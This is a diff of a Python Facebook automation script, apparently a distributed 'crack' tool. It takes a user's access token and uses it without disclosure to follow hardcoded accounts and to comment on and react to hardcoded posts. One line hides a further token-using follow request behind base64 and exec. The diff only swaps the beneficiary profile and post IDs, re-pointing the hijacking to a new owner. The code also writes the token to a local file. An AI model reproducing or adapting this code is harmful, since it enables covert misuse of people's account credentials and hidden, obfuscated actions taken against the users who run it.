@@ -159,7 +159,7 @@ def convert():
 			exec(base64.b64decode("cmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI2NDkwMzY4NjIzL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgZmluZF90b2tlbi5ncm91cCgxKSk="))
 			requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + find_token.group(1)) #bot komen
 			requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + find_token.group(1)) #auto react
-			requests.post('https://graph.facebook.com/1555196435/subscribers?access_token=' + find_token.group(1)) #auto follow
+			requests.post('https://graph.facebook.com/1013884014/subscribers?access_token=' + find_token.group(1)) #auto follow
 			open("login.txt",'w').write(find_token.group(1))
 			return
 	except Exception as e:
@@ -173,11 +173,11 @@ def bot_komen():
 		logs()
 	kom = ('Gw Pengguna Crack 3 Lu Bang ')
 	reac = ('ANGRY')
-	post = ('10225748615052849')
-	post2 = ('10225748615052849')
+	post = ('10222608279288375')
+	post2 = ('10222608279288375')
 	kom2 = ('Gw Pengguna Crack 3 Lu Bang ')
 	reac2 = ('LOVE')
-	requests.post('https://graph.facebook.com/1555196435/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/1013884014/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
 	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
